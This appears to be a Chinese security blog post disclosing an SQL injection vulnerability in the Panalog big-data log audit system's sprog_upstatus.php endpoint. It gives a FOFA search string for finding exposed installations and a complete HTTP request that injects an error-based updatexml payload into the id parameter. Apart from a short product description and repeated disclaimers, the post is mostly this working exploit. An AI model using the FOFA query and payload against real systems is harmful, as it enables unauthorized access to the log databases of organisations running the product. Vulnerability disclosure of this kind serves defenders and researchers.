#  Panalog大数据日志审计系统sprog_upstatus.php存在SQL注入漏洞   
 HK安全小屋   2025-05-29 14:56  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
panalog为一款流量分析,日志分析管理的一款软件。  
  
Panalog大数据日志审计系统定位于将大数据产品应用于高校、  公安、 政企、 医疗、 金融、 能源等行业之中，针对网络流量的信息进行日志留存，可对用户上网行为进行审计，逐渐形成大数据采集、 大数据分析、  大数据整合的工作模式，为各种网络用户提供服务。Panalog大数据日志审计系统sprog_upstatus.php存在SQL注入漏洞。  
  
  
影响版本：  
  
Panalog大数据日志审计系统  
  
  
FOFA:  
```
app="Panabit-Panalog"||body="Maintain/cloud_index.php"
```  
  
  
POC：  
```
GET /Maintain/sprog_upstatus.php?status=1&id=1%20and%20updatexml(1,concat(0x7e,md5(1)),0)&rdb=1 HTTP/1.1
Host: 
Connection: keep-alive
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: keep-alive
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Cookie: PHPSESSID=f8la8ttr74fkge0pttpc626p45
```  
  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
